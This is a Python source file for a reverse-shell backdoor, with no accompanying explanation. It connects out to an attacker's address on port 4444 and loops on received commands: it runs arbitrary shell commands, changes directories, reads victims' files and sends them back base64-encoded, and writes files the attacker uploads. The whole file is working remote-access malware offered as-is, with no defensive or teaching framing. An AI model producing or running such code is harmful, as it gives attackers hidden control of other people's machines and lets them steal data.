#!/usr/bin/python
import socket, subprocess, json, os, base64, sys

class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def reliable_send(self, data):
        if isinstance(data, bytes):
            data = data.decode()
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def reliable_receive(self):
        json_data = b""
        while True:
            try:
                part = self.connection.recv(1024)
                json_data += part
                return json.loads(json_data.decode())
            except ValueError:
                continue

    def execute_system_command(self, command):
        DEVNULL = open(os.devnull, 'wb')
        return subprocess.check_output(command, shell=True, stderr=DEVNULL, stdin=DEVNULL)

    def change_working_directory_to(self, path):
        os.chdir(path)
        return "[+] Changing working directory to " + path

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read()).decode()

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Upload successful."

    def run(self):
        while True:
            command = self.reliable_receive()

            if command[0] == "exit":
                self.connection.close()
                sys.exit()
            elif command[0] == "cd" and len(command) > 1:
                result = self.change_working_directory_to(command[1])
            elif command[0] == "download" and len(command) > 1:
                result = self.read_file(command[1])
            elif command[0] == "upload" and len(command) > 2:
                result = self.write_file(command[1], command[2])
            else:
                result = self.execute_system_command(command)

            self.reliable_send(result)

my_backdoor = Backdoor("IP address of the attacker", 4444)
my_backdoor.run()
